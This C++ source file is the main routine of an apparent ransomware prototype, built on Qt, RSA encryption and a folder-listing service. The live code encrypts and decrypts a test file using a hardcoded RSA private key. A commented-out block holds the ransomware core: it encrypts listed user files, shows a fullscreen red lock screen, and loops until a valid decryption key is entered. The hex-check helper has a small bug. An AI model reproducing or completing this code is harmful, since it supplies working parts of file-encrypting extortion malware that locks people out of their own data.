#include <QApplication>
#include <iostream>
#include "service/rsaencryptor.h"
#include "view/screenblocker.h"
#include "service/Folderservice.h"

using namespace boost::filesystem;

bool is_hexa(const std::string& s)
{
    return !s.empty() && std::find_if(s.begin(),
        s.end(), [](unsigned char c) {
        return !std::isdigit(c)
                && c != 'A' && c != 'A'
                && c != 'B' && c != 'b'
                && c != 'C' && c != 'c'
                && c != 'D' && c != 'd'
                && c != 'E' && c != 'e'
                && c != 'F' && c != 'f'; }) == s.end();
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    ScreenBlocker* screenBlocker = new ScreenBlocker();
    // Set the main window
    screenBlocker->setWindowTitle("My Window");
    screenBlocker->setStyleSheet("background-color: red;");
    // Show the window in fullscreen
    screenBlocker->showFullScreen();

    bool unblock = false;
    std::string key = "";

    FolderService folderservice;
    RSAEncryptor* encryptor = new RSAEncryptor();

    std::string fileTest ="file.txt";
    std::string privKey = "308204BC020100300D06092A864886F70D0101010500048204A6308204A20201000282010100C7FCEDAB7F4839920063C56836E5CD3DE28156FF76B90842A06EBA1CE0582D4722559DAEF0E8AC630EFAA66D9296D83F0ED562E502EBD883E3C9493763C1AC2EC6DF3077DB0364CBCF2FDB5987EA1B4074E89C1D9F662BB4959E450AA336EAC021C733831E14CA4214DE01B94B78BD9ACDD7A5DEAD35F78277FD4BE7FD04EBACF5CF1727B5BF9A520F18F0DEB1874ED711010314731988D219A0AF1F114BAEE765E87875E06E2BB91DA738EF7F9B797911EB378B50BFD180127ABB5FAC53A482730DF1DFA82E07E26D97D2130EFB3E3E22649BC70D032EE7281A71E0C6E35D7FB4996667CD166F813646860C3E5C68188307DAF0111D717107AD23D7D1CC8FF30201110282010040B3B64E12975DEB7898BFDDF3A4B357C947F67FD3963760D98D3C3684D13BD33FD067B8993C37C5B205CC6EBE7C18C91B63278653C4C60C8D75D3EC45EBD5D2E5FCEA08A8BD5550FF443060BB07F9C207B4AAFA8664D1E799D1529280194BF2DDC0728C4D7F3260AC65F17FB688F20C6FC5C4B8FBCDB1F5812C4D438690A699438E42E895C9B0D0A42B880E22951EC250842D79C3D7F632D2CAA2EE3B9FFF9D51C8FD0E6BE4AD0B2D9089AFC8E73DCB671CEEBB6531A9BA39A818519C8A83A90E11D9449E8D41D993D793DA70EBEC2920910E5FAED67577FDCFC8915E8B8C0D5AE4AA5FB8CB49A8909C2D6BFF30CDDA39F803CE6A81F8F556604424FE8BD2BD02818100C845292780365807DE472A0F82DB37B3FA6206710CFCF01884A2B68D153F7DE6713CEB83879169AA204437C722B009942E4D02A608CA46A3E23F5CC7C0263997DDD87A56F472C3EC2855A2155136D421E4E49EAA6AD62C180AD936E49C59B446F81DD9DA9BA2B5DF26D4D488EF7E7B45D02FB6D67C34AC140E4EB5E9D74D3E7D02818100FFA3AAD43802942263EE224666B0A0CA7AD7E470DA3B42A820BA2F831534EC60838421AE7FBCD9BDE4EA11C335C3999EBC2D818AC95C09E266BF7084656A0282F55B639D554C786D07EDACCEEC5F9028C191168085C4AEFF2404CF0C4C2026E0E95BAC7C992DED3BF3606AEFAE759F18E8652F9B9185954F62C0840744CF232F02818100BC7D53E8F124169DFE61188711BF437C36F2D8E2DF0C2D44409924488C77FE06103956217088DBEB69A99DE8991E27220D75A823CC09ABE589A50C074B6F4543A39E9142C7F38B389E6EB6AAA6CA3110D76DC282466F388F1944E85EB1455E60E98581BEB09923A4D940C80868EF831487B46FD8ED5EC012E04A149FD9B21CB102818100D286C8EB00F31094CAC41C39FA371B0119DEF85CEFF4913F2A02BDB73EA40DF5210367082CF5E07E440C0EA0C2DD51558BE93D815A880823DC252F7C17483E4DBAFFF7AEBEB7723BAC2D24E6A48AEF309F686CE2500B62F03BC7B991A81A7A5EDE4B7EFD32DA87224FF50CC5627EFB7DEC8F909E3B9B2FAAC9CBB805FC6E59350281806E2035E9AD4307E6DC58D80D355C1D63DA3C7B87C3F8CBCE5838FF2D58F63370111BF59D4B0880FE4B5A1E7C93CA0471CDC2B9242D541A69DA6C162B9EC05F863169D60B1646EFE6A4D987F28CC3B6904BEAB747726FDF99C9BFEBC63488B057E48F23703D6623B3D581AEA9B1AD7CFD5DDEC4B4C886207AAF1F7E42D31A1207";
    std::string encFilePath = encryptor->encryptFile(fileTest);
    encryptor->checkPrivateKey(privKey);
    std::string decFilePath = encryptor->decryptFile(encFilePath, privKey);
    //std::cout<<encFilePath<<std::endl;
    std::cout<<decFilePath<<std::endl;
    /*
    if(argc == 2) {
        key = argv[1];
        if(!is_hexa(key)) {
            std::cout<<"Wrong key type!"<<std::endl;
            exit(0);
        }

        encryptor->checkPrivateKey(key);

        std::vector<std::string> files = folderservice.list_files_for_decryption();

        for (std::string& filePath : files) {
            encryptor->decryptFile(filePath, key);
        }

        exit(0);
    }

    std::vector<std::string> files = folderservice.list_files_for_encryption();

    for (std::string& filePath : files) {
        encryptor->encryptFile(filePath);
    }

    while(!unblock) {
        screenBlocker->show();
        a.exec();

        QString Qkey = screenBlocker->getKey();

        if(Qkey != nullptr) {
            key = Qkey.toStdString();
        }

        if(!is_hexa(key)) {
            std::cout<<"Wrong key type!"<<std::endl;
            unblock = false;
        } else {
            try {
                encryptor->checkPrivateKey(key);

                std::vector<std::string> files = folderservice.list_files_for_decryption();

                for (std::string& filePath : files) {
                    encryptor->decryptFile(filePath, key);
                }
                unblock = true;

            } catch(SignatureVerificationFilter::SignatureVerificationFailed keyVerifFailedException) {
                std::cout<<"[KEY-ERROR]"<<keyVerifFailedException.what()<<std::endl;
                screenBlocker->clearKey();
                unblock = false;
            } catch(Exception ex) {
                std::cout<<"[DECRYPTION-ERROR] Error when decrypting files: "<<ex.what()<<std::endl;
                screenBlocker->clearKey();
                unblock = false;
            }
        }
    }
    */
    delete encryptor;
    return 0;
}
